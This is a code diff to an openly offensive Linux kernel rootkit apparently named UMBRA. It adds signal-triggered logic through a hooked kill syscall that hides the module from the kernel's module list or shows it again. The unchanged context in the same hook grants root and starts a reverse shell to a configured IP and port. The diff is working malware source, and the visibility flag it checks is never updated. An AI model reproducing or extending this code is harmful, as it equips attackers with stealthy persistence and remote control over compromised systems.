@@ -21,6 +21,11 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs){
     return 0;
 }
 
+//Keep track of whether the rootkit is hidden or not
+static int rootkit_visibility = 1;
+//Previous module on kernel module list, to remember the original position in case we remove it
+static struct list_head *prev_module;
+
 asmlinkage long (*orig_kill)(const struct pt_regs*);
 asmlinkage int hook_kill(const struct pt_regs *regs){
     void set_root(void);
@@ -33,6 +38,22 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
         return 0;
     }else if(sig == SIGNAL_REVERSE_SHELL){
         start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
+    }else if(sig == SIGNAL_SHOW_KERNEL_MODULE){
+        if(rootkit_visibility == 1){
+            printk(KERN_INFO "UMBRA:: Requested visibility, but already visible.\n");
+            return 0;
+        }
+        //Adding the rootkit to the linked list of modules maintained by the kernel
+        list_add(&THIS_MODULE->list, prev_module);
+        return 0;
+    }else if(sig == SIGNAL_HIDE_KERNEL_MODULE){
+        if(rootkit_visibility == 0){
+            printk(KERN_INFO "UMBRA:: Requested hiding, but already hidden.\n");
+            return 0;
+        }
+        //Removing the rootkit from the linked list of modules maintained by the kernel
+        prev_module = THIS_MODULE->list.prev;
+        list_del(&THIS_MODULE->list);
     }
 
     return orig_kill(regs);
